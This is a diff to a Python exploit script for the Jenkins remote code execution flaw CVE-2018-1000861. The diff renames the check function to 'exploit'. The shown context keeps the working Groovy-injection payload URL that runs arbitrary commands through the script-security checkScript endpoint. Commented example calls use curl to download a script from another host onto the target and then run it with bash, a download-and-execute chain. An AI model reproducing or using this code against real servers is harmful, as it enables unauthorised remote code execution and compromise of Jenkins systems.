@@ -12,7 +12,7 @@
 import requests
 
 
-def chack_cve_2018_1000861(target_url, command):
+def exploit(target_url, command):
     # 构造payload连接
     payload = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy' \
               '.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"%s".execute()}}' % \
@@ -43,8 +43,8 @@ def chack_cve_2018_1000861(target_url, command):
         return False
 
 
-def vuln_scan_start(target_url, command):
-    chack_cve_2018_1000861(target_url, command)
+def vuln_exploit_start(target_url, command):
+    exploit(target_url, command)
 
-# vuln_scan_start("http://192.168.12.130:8080", "curl -o /tmp/bash.txt http://192.168.12.152:8080/bash.txt")
-# vuln_scan_start("http://192.168.12.130:8080", "bash /tmp/bash.txt")
+# vuln_exploit_start("http://192.168.12.130:8080", "curl -o /tmp/bash.txt http://192.168.12.152:8080/bash.txt")
+# vuln_exploit_start("http://192.168.12.130:8080", "bash /tmp/bash.txt")
